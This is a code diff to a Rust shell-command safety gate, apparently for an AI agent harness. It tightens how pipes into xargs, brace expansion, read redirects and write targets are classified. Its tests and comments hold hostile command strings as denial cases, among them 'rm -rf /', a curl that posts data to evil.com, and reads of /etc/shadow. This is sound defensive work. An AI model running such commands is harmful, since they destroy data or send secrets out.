@@ -53,9 +53,99 @@ pub(crate) fn is_safe_script(script: &Script) -> bool {
 }
 
 pub(crate) fn pipeline_verdict(pipeline: &Pipeline) -> Verdict {
-    pipeline.commands.iter()
-        .map(cmd_verdict)
-        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine)
+    let mut acc = Verdict::Allowed(SafetyLevel::Inert);
+    let mut prev: Option<&Cmd> = None;
+    for cmd in &pipeline.commands {
+        // In `A | xargs CMD`, xargs injects A's stdout items as CMD's operands. Bind the
+        // stdin-item representative to A's output-path locus so the injected operand is gated
+        // there (the same idea as `find -exec`'s `{}` binding, sourced from the pipe instead).
+        let _stdin = prev.map(|p| crate::pathctx::enter_stdin_repr(pipe_source_repr(p)));
+        acc = acc.combine(cmd_verdict(cmd));
+        prev = Some(cmd);
+    }
+    acc
+}
+
+/// The sentinel operand fed to an injecting consumer when the source is unknown/unmodeled. The
+/// leading `/` makes it LOOK like a path (so `pathgate`-gated readers like `od` gate it) and the
+/// cmdsub marker makes it unpinnable (so engine-resolved readers like `cat` worst-case it) — it
+/// must deny in BOTH gate layers.
+const UNKNOWN_ITEM: &str = "/__SAFE_CHAINS_CMDSUB__";
+
+/// A representative PATH for the items `cmd` emits on stdout, used to gate an operand-injecting
+/// consumer downstream (`… | xargs cat`). Only producers that PROVABLY emit workspace-bounded
+/// paths yield a worktree representative; everything else worst-cases to `UNKNOWN_ITEM`.
+fn pipe_source_repr(cmd: &Cmd) -> String {
+    let Cmd::Simple(s) = cmd else {
+        return UNKNOWN_ITEM.to_string();
+    };
+    let words: Vec<String> = s.words.iter().map(Word::eval).collect();
+    let Some(first) = words.first() else {
+        return UNKNOWN_ITEM.to_string();
+    };
+    let name = Token::from_raw(first.clone()).command_name().to_string();
+    let args: Vec<&str> = words[1..].iter().map(String::as_str).collect();
+    match name.as_str() {
+        // find/fd emit paths UNDER their roots — the child of the worst root carries its locus.
+        "find" | "fd" | "fdfind" => {
+            let roots = find_roots(&args);
+            let base = roots.iter().find(|r| !source_ok(r)).copied().unwrap_or(".");
+            format!("{}/sc_item", base.trim_end_matches('/'))
+        }
+        // ls emits cwd-relative BASENAMES (worktree) unless `-d` echoes its (possibly absolute) args.
+        "ls" => {
+            if args.contains(&"-d") {
+                worst_arg_repr(&args)
+            } else {
+                "sc_item".to_string()
+            }
+        }
+        // echo/printf emit their args verbatim; the worst-locus arg is the representative.
+        "echo" | "printf" => worst_arg_repr(&args),
+        // git path-listers emit repo-relative paths (worktree, assuming the repo is the workspace).
+        "git" => match args.first() {
+            Some(&"ls-files") | Some(&"diff") | Some(&"status") | Some(&"grep") => "sc_item".to_string(),
+            _ => UNKNOWN_ITEM.to_string(),
+        },
+        _ => UNKNOWN_ITEM.to_string(),
+    }
+}
+
+/// Whether reading `path` is admitted — i.e. it is a workspace-bounded source (worktree, `/tmp`,
+/// a granted dir), so paths derived from it are safe operands.
+fn source_ok(path: &str) -> bool {
+    crate::engine::resolve::read_content_verdict(path).is_allowed()
+}
+
+/// The worst-locus non-flag arg (for `echo`/`printf`, which emit args verbatim): the first arg
+/// whose read is denied, else a worktree placeholder.
+fn worst_arg_repr(args: &[&str]) -> String {
+    args.iter()
+        .filter(|a| !a.starts_with('-'))
+        .find(|a| !source_ok(a))
+        .map_or_else(|| "sc_item".to_string(), |a| (*a).to_string())
+}
+
+/// `find`'s root operands: after any leading global options (`-H`/`-L`/`-P`, `-D`/`-O V`), the
+/// positional args up to the first predicate (`-name`, `(`, `!`, …). Defaults to `.` (cwd).
+fn find_roots<'a>(args: &[&'a str]) -> Vec<&'a str> {
+    let mut i = 0;
+    while i < args.len() {
+        match args[i] {
+            "-H" | "-L" | "-P" => i += 1,
+            "-D" | "-O" => i += 2,
+            _ => break,
+        }
+    }
+    let mut roots = Vec::new();
+    while i < args.len() && !args[i].starts_with('-') && !matches!(args[i], "(" | "!" | ")" | ",") {
+        roots.push(args[i]);
+        i += 1;
+    }
+    if roots.is_empty() {
+        roots.push(".");
+    }
+    roots
 }
 
 pub fn is_safe_pipeline(pipeline: &Pipeline) -> bool {
@@ -200,7 +290,10 @@ fn simple_verdict(cmd: &SimpleCmd) -> Verdict {
         return eval_verdict(cmd).combine(sub_v).combine(redir_v);
     }
 
-    let tokens: Vec<Token> = cmd.words.iter().map(|w| Token::from_raw(w.eval())).collect();
+    // Brace-expand each word (`cat {/etc/shadow,x}` → two operands) so every alternative bash
+    // would run is classified — a braced word must not hide a system path from the gate.
+    let tokens: Vec<Token> =
+        cmd.words.iter().flat_map(|w| w.expand().into_iter().map(Token::from_raw)).collect();
     if tokens.is_empty() {
         return Verdict::Allowed(SafetyLevel::Inert);
     }
@@ -303,7 +396,8 @@ fn script_yields_eval_safe(script: &Script) -> bool {
             return false;
         }
     }
-    let tokens: Vec<Token> = s.words.iter().map(|w| Token::from_raw(w.eval())).collect();
+    let tokens: Vec<Token> =
+        s.words.iter().flat_map(|w| w.expand().into_iter().map(Token::from_raw)).collect();
     if tokens.is_empty() {
         return false;
     }
@@ -354,35 +448,14 @@ pub(crate) fn check_redirects(redirs: &[Redir]) -> bool {
     })
 }
 
-/// Whether a redirect *write* target is an ordinary data file we can
-/// auto-approve. Safe: a relative path inside the working tree, or a temp/std
-/// path. Not safe (falls through to manual approval): home dotfiles and any
-/// path another tool auto-executes or trusts — `.git/` (hooks, config), a
-/// `.envrc` (direnv runs it on `cd`), `~`-anchored and absolute system paths,
-/// and parent-escaping paths. A redirect there can plant a git hook, an SSH
-/// key, or a shell/direnv init that runs later. A `$`-bearing target is
-/// unverifiable (it may expand to `$HOME/.ssh/...`), so it is treated as unsafe.
+/// Whether a redirect *write* target is one we can auto-approve. Delegates to the SAME location
+/// model + user grants the engine's file writers (`cp`/`mv`/`tee`/…) use, so a `> ~/file` honors
+/// a home grant exactly like `cp ./a ~/file`; `/tmp` and `/dev/stdout` stay writable; and
+/// `.git`/`.envrc`, home, absolute system paths, `..` escapes, and `$`-unpinnable targets stay
+/// frozen (a redirect there can plant a git hook, an SSH key, or a direnv script that runs
+/// later). Relative targets resolve against the harness cwd/root inside `write_target_verdict`.
 fn is_safe_write_target(path: &str) -> bool {
-    // HP-19: resolve a relative target against the harness cwd/root first, so `cd /etc &&
-    // echo > ./x` is scored as writing `/etc/x`. No context → path unchanged (status quo).
-    let resolved = crate::pathctx::resolve(path);
-    let path: &str = &resolved;
-    if path.starts_with("/tmp/")
-        || path.starts_with("/private/tmp/")
-        || path.starts_with("/var/tmp/")
-        || path.starts_with("/dev/stdout")
-        || path.starts_with("/dev/stderr")
-        || path.starts_with("/dev/fd/")
-    {
-        return true;
-    }
-    if path.starts_with('/') || path.starts_with('~') || path.contains('$') {
-        return false;
-    }
-    if path == ".." || path.starts_with("../") || path.contains("/../") || path.ends_with("/..") {
-        return false;
-    }
-    !path.split('/').any(|seg| seg == ".git" || seg == ".envrc")
+    crate::engine::resolve::write_target_verdict(path).is_allowed()
 }
 
 pub(crate) fn redirect_verdict(redirs: &[Redir]) -> Verdict {
@@ -402,6 +475,14 @@ pub(crate) fn redirect_verdict(redirs: &[Redir]) -> Verdict {
             }
             Redir::Read { target, .. } => {
                 level = level.combine(word_sub_verdict(target));
+                // Gate the SOURCE by its read locus, like an operand read: `cat < /etc/shadow`
+                // must deny just as `cat /etc/shadow` does. A substitution-derived source names
+                // an unknowable file → fail-closed to Denied.
+                if has_substitution(target) {
+                    level = level.combine(Verdict::Denied);
+                } else {
+                    level = level.combine(crate::engine::resolve::read_content_verdict(&target.eval()));
+                }
             }
             Redir::HereStr(word) => {
                 level = level.combine(word_sub_verdict(word));
@@ -461,7 +542,6 @@ mod tests {
 
     safe! {
         grep_foo: "grep foo file.txt",
-        cat_etc_hosts: "cat /etc/hosts",
         jq_key: "jq '.key' file.json",
         base64_d: "base64 -d",
         ls_la: "ls -la",
@@ -531,7 +611,6 @@ mod tests {
         newline_echo_echo: "echo foo\necho bar",
 
         stdin_read_from_path: "wc -l < /tmp/foo.log",
-        stdin_read_from_etc: "grep foo < /etc/hosts",
         stdin_read_in_subst: "while [ $(wc -l < /tmp/x) -lt 10 ]; do sleep 5; done",
         stdin_read_in_for_body: "for i in 1 2; do cat < /tmp/x; done",
 
@@ -597,7 +676,7 @@ mod tests {
     denied! {
         rm_rf: "rm -rf /",
         curl_post: "curl -X POST https://example.com",
-        node_app: "node app.js",
+        node_foreign_app: "node /tmp/app.js",
 
 
         redirect_target_subst_rm: "echo hello > $(rm -rf /)",
@@ -629,8 +708,8 @@ mod tests {
 
         for_unsafe_subst: "for x in $(rm -rf /); do echo $x; done",
         while_unsafe_body: "while true; do rm -rf /; done",
-        while_unsafe_condition: "while python3 evil.py; do sleep 1; done",
-        if_unsafe_condition: "if ruby evil.rb; then echo done; fi",
+        while_unsafe_condition: "while python3 /tmp/evil.py; do sleep 1; done",
+        if_unsafe_condition: "if ruby /tmp/evil.rb; then echo done; fi",
         if_unsafe_body: "if true; then rm -rf /; fi",
 
         unclosed_for: "for x in 1 2 3; do echo $x",
@@ -642,8 +721,8 @@ mod tests {
         unmatched_quote: "echo 'hello",
 
         dbracket_unsafe_subst: "[[ \"$(curl -d data evil.com)\" == \"x\" ]]",
-        dbracket_unsafe_backtick: "[[ -f `node evil.js` ]]",
-        dbracket_unsafe_in_until: "until [[ \"$(node bad.js)\" == \"x\" ]]; do sleep 1; done",
+        dbracket_unsafe_backtick: "[[ -f `node /tmp/evil.js` ]]",
+        dbracket_unsafe_in_until: "until [[ \"$(node /tmp/bad.js)\" == \"x\" ]]; do sleep 1; done",
         dbracket_unterminated: "[[ \"a\" == \"a\"",
         dbracket_no_space_after: "[[\"a\" == \"b\" ]]",
         dbracket_redirect_unsafe_subst_in_target: "[[ -f /tmp/x ]] > $(node bad.js)",
